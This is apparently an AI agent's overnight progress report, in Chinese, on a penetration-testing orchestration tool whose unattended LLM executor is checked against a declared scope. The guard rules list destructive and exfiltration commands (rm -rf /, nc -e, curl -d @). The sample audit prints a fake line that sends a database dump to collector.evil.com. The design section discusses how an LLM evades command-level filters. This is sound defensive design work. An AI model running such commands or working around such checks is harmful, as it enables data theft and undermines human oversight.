# 夜间进度报告

生成时间：2026-11-15 01:45
分支：`p1-store` · 标签：`p0-kernel` → `p1-console`

---

## 一句话

P0（事件总线）和 P1（SQLite 索引 + Web 控制台）都已完成并推送。明天你只需要跑一条命令就能在浏览器里看到图。

## 现在就能用

```bash
cd D:\sapper-v2\demo
sapper serve --rebuild
```

浏览器打开 http://127.0.0.1:8787

看到的界面：

```
┌──────────────────────────────────────────────┬──────────────┐
│  sapper 控制台                                │  事件流       │
│  facts 5  intents 3  open 2  seq 12          │  01:44:12     │
│                                              │  fact.created │
│        ● 边界主机                             │  01:44:30     │
│         ╲                                    │  intent.done  │
│          ■ 子网扫描                           │              │
│         ╱                                    │              │
│        ● 服务清单                             │              │
│                                              │              │
│  [图例] host service vuln cred loot flag     │              │
└──────────────────────────────────────────────┴──────────────┘
```

- 圆点 = fact（按 kind 着色）
- 方块 = intent（灰色 open / 绿色 done）
- 连线 = `from` / `to` 关系
- 右侧事件流每 2 秒自动刷新
- 鼠标悬停看详情，可以拖动节点

## 实测证据

```
$ curl /api/health
{"ok": true, "stats": {"facts": 4, "intents": 1, "open": 0, "done": 1,
                       "kinds": {"host":1,"service":1,"vuln":1,"note":1}}, "seq": 0}

# CLI 再加一个 fact 后
$ curl /api/health
{"ok": true, "stats": {"facts": 5, ..., "kinds": {...,"cred":1}}, "seq": 1}

$ curl /api/events?since=0
{"events": [{"seq":1, "event":"fact.created", ...}]}
```

**CLI 与 Web 是同一份数据**，且不需要重启服务——CLI 写文件时同步更新索引，前端轮询即可看到。

---

## 架构决策：为什么索引只是"派生"

关键取舍：**JSON 文件仍是唯一权威源，SQLite 是只读派生索引。**

```
CLI 写 JSON ──► 事件总线 ──► SQLite 索引 ──► HTTP API ──► 浏览器
                  │
                  └─ 失败也不影响主流程
```

好处：
- 索引删了、坏了、版本不兼容了，`sapper` 命令照常跑
- 不需要迁移，不需要双写一致性的复杂逻辑
- Web 服务挂掉不影响正在跑的作战
- 以后要换 PostgreSQL 或多人协作，只需要换索引层

代价：
- 索引数据可能落后于 JSON（如果 `_index_event` 静默失败）
- 用 `sapper serve --rebuild` 可以随时全量重建

## 新增文件

| 文件 | 行数 | 作用 |
|---|---|---|
| `lib/bus.py` | 120 | 事件总线（P0）|
| `lib/index_db.py` | 260 | SQLite 索引层 |
| `lib/server.py` | 165 | HTTP 服务 |
| `web/index.html` | 260 | 前端单页 |
| `PLAN.md` | 120 | 演进计划 |

对上游代码的改动：`lib/sapper.py` 净增约 60 行（辅助函数 + 7 个发射点 + serve 子命令），**没有修改任何现有逻辑**。

## API 一览

| 端点 | 返回 |
|---|---|
| `GET /api/health` | 存活 + 统计 + 当前 seq |
| `GET /api/graph` | 全部 facts + intents + stats |
| `GET /api/events?since=N` | 增量事件（轮询用）|
| `GET /api/fact/<id>` | 单个 fact |
| `GET /api/intent/<id>` | 单个 intent |

## 回滚

```bash
git checkout p0-kernel     # 只有事件总线，没有 Web
git checkout fa8b4e3       # 只有 Windows 适配
git checkout 7b75e6f       # 上游原版
```

## 回归测试（20 项，连续两次全通过）

`python tests/regress.py` —— 不依赖 pytest，也不依赖 fcntl，通过 `bin/sapper_win.py` 驱动，Windows 和 Linux 都能跑。

| 套件 | 项数 | 覆盖 |
|---|---|---|
| **cli** | 4 | setup 结构、fact→claim→done 链路、只读命令、非法 kind 拒绝 |
| **guard** | 10 | 私有放行、公网 ask、越界 deny、`--force-guard`、`--no-guard`、破坏性、外传补确认位、子域边界、文件名不误判、scope 损坏降级 |
| **index** | 3 | 缺失可用、损坏可用、建索引后增量同步 |
| **audit** | 2 | 识别越界并落 fact、干净日志不告警 |
| **serve** | 1 | 只读模式 POST 返回 403 |

```
==================================================
20/20 通过
```

### 测试发现并修掉的两个真实缺陷

1. **`guard` 无 scope 时一律 ask** —— 与设计文档（"未设置范围只提示不拦截"）不符，新用户每个 intent 都会被挡。改为：私有网段放行，公网才 ask。
2. **`serve` 遇到损坏索引直接 500** —— 原来只在"索引不存在"时重建。改为启动时探测可用性，损坏则删掉重建。

### 审查结论

对上游 `lib/sapper.py` 的改动是 `+289 / -7`，那 7 行删除**全部是 `return` 语句**（移到文件锁之外执行 emit）。原有逻辑一行未删。

## 已知问题

1. **前端没做视觉验证**——我这边没有浏览器，只验证了 HTML 返回 200 和 API 数据正确。D3 渲染效果需要你打开看一眼。**这是唯一没有自动化覆盖的部分。**
2. **`sapper serve` 是阻塞进程**——按 Ctrl+C 停止。要做成后台服务需要额外处理 Windows 信号，留给 P4。
3. **索引不记录 rebuild 之前的历史事件**——`--rebuild` 只导数据不导事件，所以事件流从 seq 0 开始是空的，之后的新事件才出现。这是有意的（避免伪造历史）。
4. **上游 `tests/test_sapper.py` 在 Windows 上跑不了**——它直接 `import sapper`，而 sapper 顶部 `import fcntl`。`tests/regress.py` 是为了绕开这个限制写的替代品。

## P2 已完成（追加）

原计划的「待决策」已经落地，方案是 **A + 事后审计**。

### 三道检查（`lib/guard.py`）

| 检查 | 触发 | 动作 |
|---|---|---|
| **scope** | 目标 IP/CIDR/域名不在 `.sapper/scope.json` 内 | deny |
| **destructive** | `rm -rf /`、`mkfs`、`DROP TABLE`、fork bomb | deny |
| **exfil** | `curl -d @`、`nc -e`、`scp @`、`ssh < file` | ask |

9 个用例全通过（范围内/越界 IP/子域匹配/越界域名/破坏/删库/外传/反弹 shell/正常）。

### 用法

```bash
sapper scope add 10.0.0.0/24        # 声明授权范围
sapper scope add example.com
sapper scope                        # 查看

sapper dispatch i001               # 派发前自动检查
sapper dispatch i001 --force-guard # 明知有风险，仍要派发
sapper dispatch i001 --no-guard    # 完全跳过检查

sapper confirm i001                # 批准被 ask 的任务

sapper audit --file runs/x.log --record   # 事后扫描
```

### Web 端审批

`sapper serve --allow-write` 启动后，鼠标悬停在待审批的 intent 上会出现「批准派发」按钮：

```
┌─────────────────────────────┐
│ i002 · intent · open        │
│ 把结果发到收集端             │
│ [ 批准派发 ]                 │
└─────────────────────────────┘
```

点击后 `POST /api/confirm/i002` → 写 JSON → 更新索引 → 事件流出现 `intent.confirmed`。

**没有 `--allow-write` 时整个服务是只读的**，这是 P1 的承诺，P2 没有破坏它。

### 为什么不做命令级拦截

executor 是容器里的 claude CLI，它自己执行命令。拦截要改镜像、加 wrapper、每次往返宿主机确认——8 小时无人值守会直接废掉。

更关键的是：**规则追不上 LLM**。你拦 `rm -rf`，它改 `find -delete`；你拦 `find`，它改 `python -c shutil.rmtree`。

所以改为守「意图」：LLM 能改命令，改不了它自己声明的目标列表。范围检查是唯一真正防住法律风险的一环，而这一环只有意图层做得到。

### 事后审计（`lib/audit.py`）

```
$ sapper audit --file fake.log --record
audit: fake.log 发现 3 项可疑
  [deny] curl -d @/tmp/dump.sql http://collector.evil.com/up
      - 目标越界: collector.evil.com
      - exfil: curl -d
  [deny] ssh root@8.8.8.8 < /etc/passwd
      - 目标越界: 8.8.8.8
  [deny] (整体文本)
recorded as f002
```

支持三种 transcript 格式：`$ cmd`、`[bash] cmd`、`● Bash(cmd)`。

## 下一步（P3）

P3 是 MITM 流量录制。要点：

- 用 `mitmproxy`，不自研代理
- addon 把请求写进 `traffic` 表（P1 已有 SQLite，加一张表即可）
- **必须先过滤再入库**，否则三天爆库：只存 2xx/3xx、非静态资源、含敏感关键字的
- 前端加「流量」页，可按域名/状态码/关键字搜索

预计 4–5 小时。注意证书固定（pinning）的目标录不到，这是硬限制。

---

晚安。明天 `git log --oneline` 就能看到所有改动。
